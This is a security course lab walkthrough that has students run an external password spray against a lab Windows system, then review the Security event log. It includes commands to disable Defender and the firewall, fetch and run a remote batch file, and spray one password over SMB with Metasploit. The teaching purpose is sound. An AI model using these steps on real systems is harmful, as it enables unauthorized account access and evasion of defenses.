![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# External Password Spray

In this lab we will be conducting a password spray against a Windows system.

This is part of the T1110 family of attacks with MITRE.

Find out more here:

https://attack.mitre.org/techniques/T1110/ 

Here are just some of the groups that have used it.

<img width="1073" height="764" alt="image" src="https://github.com/user-attachments/assets/a24a4a9c-305d-476d-a808-417d0c3b5a3c" />

<br>

First things first, disable **Defender**. Open an instance of **Windows PowerShell** by clicking on the icon in the taskbar. 

![](/IntroClassFiles/Tools/IntroClass/attachmentsfornewlabs/powershelltaskbar.png)


Then run the following:


```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

This will disable **Defender** for this session.

If you get angry red errors, that is Ok, it means **Defender** is not running.

Let's get started by opening a **Command Prompt** terminal by double-clicking the icon on the desktop:

![](attachmentsfornewlabs/opencommandprompt.png)


Let's first get our IP address for your Windows system. 

We will be using this later, so write it down if you need.

```
ipconfig
```

Next, let's make sure the firewall is down.  This will allow us to configure the system to match what many internal systems have.

No firewall.....  So much for defense in depth.

```
netsh advfirewall set allprofiles state off
```
<br>

Next, navigate into the appropriate directory by running the following command:

```
cd \IntroLabs
```

We need to run the batch file named **200-user-gen** 

First, let's get an updated version:

```
curl -o 200-user-gen.bat https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/200-user-gen.bat
```

Now, we need to run it!

Do so by typing the name of the batch file and hitting enter:

```
.\200-user-gen.bat
```

It should look like this:

<img width="907" height="463" alt="img01" src="https://github.com/user-attachments/assets/79b9eb59-e2eb-42e3-bf7d-6f738a3cfdbe" />

Let this run all the way through. 

**Even though it looks endless, it's not!**

<br>

Once that finishes, we need to get our attack system ready.

First, let’s open up an **Ubuntu Shell** by double-clicking the icon on the desktop:

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />

<br>

Next, let's become root:

```
sudo su -
```

Now, let's get a user list:

```
wget https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/users.txt
```

It should look like this:

<img width="827" height="206" alt="img02" src="https://github.com/user-attachments/assets/bdd8e134-c52e-4de7-9e5f-133847c5e9d5" />

>[Note]
>
>A list like this would be acquired by running recon on sites like LinkedIn, or even possibly a company directory!

Now, let's start up and configure Metasploit for the remote attack!

Go ahead and run the following:

```
msfconsole -q
```

```
use auxiliary/scanner/smb/smb_login
```

```
set RHOST [Your Windows IP]
```

>[!Note]
>
>**Remember!! Your IP address will be different!!!!!**

<br>

```
set USER_FILE users.txt
```

```
set SMBPASS Winter2025
```

It should look like this:

<img width="710" height="162" alt="img03" src="https://github.com/user-attachments/assets/9fab8c30-b07a-401d-82a1-170178243c9c" />

<br>

**But wait!!!!**

Before we run it we should clear the event logs so it is easier to see the attack!

Let's open event viewer on Windows.

Do this by searching "Event Viewer" in the search box in the taskbar.

<img width="347" height="624" alt="image" src="https://github.com/user-attachments/assets/bca40bdc-c325-419b-8f20-28de81f96f9e" />

<br>

Click on the "Windows Logs" folder on the left side to expand it, then right-click on the Security events and clear them.

<img width="326" height="383" alt="image" src="https://github.com/user-attachments/assets/94e4a7d7-568b-4e76-bb72-fd3d223193d1" />

When it asks you to clear, just hit Clear.  No need to save.

Now, let's go back to the **Ubuntu Shell** and run our attack.

```
run
```

It should look like this:

<img width="601" height="374" alt="img04" src="https://github.com/user-attachments/assets/ebffe6b2-50a4-4ea3-a220-f8710207ab64" />

Please look closer at the green successful login accounts.

<img width="656" height="88" alt="img05" src="https://github.com/user-attachments/assets/e641456f-3827-4fea-8aa4-3272e6db8346" />

Are there any Administrator logins?

Yes! There is!!

<img width="660" height="17" alt="img06" src="https://github.com/user-attachments/assets/391368b8-e70b-408a-99ba-624676297f7a" />

<br>

Now, let's look at the logs back in the Event Viewer. In the left pane, click on Windows Logs > Security.

In the action panel on the right you will need to click the refresh button.

<img width="200" height="383" alt="image" src="https://github.com/user-attachments/assets/9bb4440d-d344-4258-b2a0-e401f1dea6e5" />

<br>
Now, we should be able to see the logs.

<br>
<img width="1168" height="687" alt="image" src="https://github.com/user-attachments/assets/d78f04d6-b2f6-4c71-90b8-092a3467badd" />

##

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---

